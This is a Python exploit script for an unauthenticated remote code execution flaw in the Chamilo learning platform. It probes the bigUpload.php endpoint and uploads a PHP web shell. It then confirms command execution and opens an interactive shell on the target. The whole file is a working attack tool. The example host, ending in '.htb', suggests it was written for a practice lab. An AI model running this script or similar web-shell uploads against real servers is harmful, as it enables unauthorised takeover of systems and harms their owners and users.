#! /usr/bin/env python3
import requests
from rich.console import Console
from rich.markdown import Markdown
from prompt_toolkit import PromptSession
import argparse
import time
import faker

#Chamilo Unauthenticated RCE
class Exploit:
      def __init__(self,url) -> None:
          if url.endswith("/"):
              self.url = url[0:len(url)-1]
          else:
              self.url = url
      def testingUrl(self):
          print(f"[+]Testing existence of \"bigUpload.php\"")
          resp = requests.get(self.url+"/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported")
          if resp.status_code == 200 and resp.text == "The uploaded file could not be saved (perhaps a permission problem?)":
              return "yay"
          else:
              return "nay"
      def upload(self) -> str:
          #Running method testingUrl
          if Exploit.testingUrl(self) == "yay":
             print(f"[+]Site is vulnerable")
          else:
              print("[+]Site is not vulnerable")
              exit()
          php_reverse_shell = "<?php echo system($_GET['cmd']); ?>"
          fake = faker.Faker()
          php_shell_name = f"rebel{str(fake.random_int())}.php"
          print("[+] Uploading web shell") 
          file =  {"bigUploadFile": (php_shell_name,php_reverse_shell)}
          response = requests.post(self.url+"/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported",files=file)
          if "The file has successfully been uploaded." in response.text:
              print("[+]Shell uploaded!!!")
          else:
              print("[+]Shell not uploaded")
              exit()
          print("[+]Testing shell")
          shell_endpoint = self.url + "/main/inc/lib/javascript/bigupload/files/"+ php_shell_name
          print("[+]Executing command [id]")
          id_output = requests.get(shell_endpoint+"?cmd=id").text
          print("[+]"+id_output)
          return shell_endpoint
      def execute_commands(self,shell_endpoint,command: str) -> str:
          response = requests.get(shell_endpoint+"?cmd="+command)
          return response.content.decode()

def main():
    #Argument Parser
    parser = argparse.ArgumentParser()
    parser.add_argument("-hst","--host",help="Enter a host e.g 'http://omoh.htb'")
    args = parser.parse_args()
    if not args.host:
        print("[+] Host not provided,use --help")
        exit()
    
    #Class exploit
    exploit = Exploit(str(args.host))
    shell_endpoint = exploit.upload()
    #Shell
    console = Console()
    session = PromptSession()
    user = exploit.execute_commands(shell_endpoint,"whoami")
    hostname = exploit.execute_commands(shell_endpoint,"hostname")
    markdown = Markdown("""# **SHELL** """)
    console.print(markdown)
    while True:
          try:
             command = session.prompt(f"{user}@{hostname}: # ")
             if command == "exit":
                with console.status("Exiting",spinner="moon"):
                     time.sleep(2)
                     exit()
          except KeyboardInterrupt:
                 continue
          else:
               result = exploit.execute_commands(shell_endpoint,command)
               console.print(f"[red]{result}[/red]")


if __name__ == "__main__":
   main()
    
